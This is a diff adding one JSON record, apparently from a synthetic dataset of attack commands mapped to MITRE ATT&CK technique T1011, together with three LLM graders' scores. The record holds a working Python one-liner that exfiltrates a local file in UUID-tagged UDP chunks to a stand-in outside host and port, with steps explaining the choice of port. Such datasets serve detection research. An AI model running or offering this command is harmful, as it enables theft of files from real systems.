@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Python",
+  "command": "python3 -c 'import socket,uuid; s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM); addr=(\"203.0.113.200\", 53530); tid=str(uuid.uuid4()).encode(); d=open(\"/Users/Shared/.dmp\",\"rb\").read(); [ s.sendto(tid+b\"|\"+d[i:i+500], addr) for i in range(0,len(d),500) ]; s.close()'",
+  "explanation": "Chunks data into UUID-tagged UDP datagrams to a high, non-standard port, simulating a DNS-like alternate medium without using the common DNS port, aligning with T1011.",
+  "rationale_steps": [
+    "Open a UDP socket and choose a non-standard high port (53530) to avoid 53.",
+    "Tag each chunk with a transaction ID to reassemble remotely.",
+    "Use UDP as an alternate medium distinct from primary C2 channels.",
+    "No obfuscation; user-space only."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1011-e8d4b4c2-022e3e02",
+  "source_prompt_hash": "e8d4b4c2",
+  "timestamp_utc": "2025-09-30T08:45:56.629990Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with balanced quoting and valid Python code that creates a UDP socket, reads a file, chunks data, sends it, and closes the socket.",
+        "semantic_score": 2,
+        "semantic_justification": "While it exfiltrates data via UDP to a high port, this uses the standard IP network rather than a different network medium (e.g., cellular/Wi‑Fi/Bluetooth), so it is misaligned with T1011 despite being operationally plausible.",
+        "combined_score": 3.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T01:27:45.764446Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python one-liner is well-formed with balanced parentheses, proper string delimiters, valid socket API calls, and correct list comprehension syntax for chunked UDP transmission.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command correctly implements UDP-based data exfiltration with chunking and UUID tagging, it uses a standard IP network socket (AF_INET/SOCK_DGRAM) rather than a genuinely different network medium (cellular, Bluetooth, Wi-Fi interface), so it does not authentically demonstrate T1011's core concept of using an alternate network medium distinct from the C2 channel—it is more accurately T1048 (Exfiltration Over Alternative Protocol) over UDP.",
+        "combined_score": 4.0,
+        "confidence": 0.85,
+        "timestamp": "2026-02-18T22:10:12.141612Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is a perfectly formed Python one-liner with balanced parentheses, brackets, and quotes, using valid library calls and syntax.",
+        "semantic_score": 4,
+        "semantic_justification": "The command effectively chunks file data into UDP packets with a unique identifier for reassembly, though its classification as T1011 is slightly weak as it relies on standard IP routing rather than explicitly forcing a separate hardware medium.",
+        "combined_score": 4.5,
+        "confidence": 1,
+        "timestamp": "2026-02-18T22:10:15.933931Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.0,
+    "llm_average_score": 4.0,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
